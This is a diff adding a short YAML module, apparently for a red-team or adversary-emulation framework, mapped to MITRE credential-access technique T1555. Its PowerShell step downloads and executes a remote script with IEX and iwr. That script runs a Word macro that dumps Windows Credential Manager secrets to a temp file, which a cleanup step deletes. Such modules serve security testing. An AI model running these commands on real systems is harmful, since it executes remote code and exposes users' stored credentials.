@@ -1,0 +1,25 @@
+api_version: "2.0"
+name: Extract Windows Credential Manager via VBA
+description: |
+    This module will extract the credentials found within the Windows credential manager and dump
+    them to $env:TEMP\windows-credentials.txt
+uuid: 234f9b7c-b53d-4f32-897b-b880a6c9ea7b
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1555: Credentials from Password Stores'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: extract-windows-credential-manager-via-vba
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
+        executor: powershell
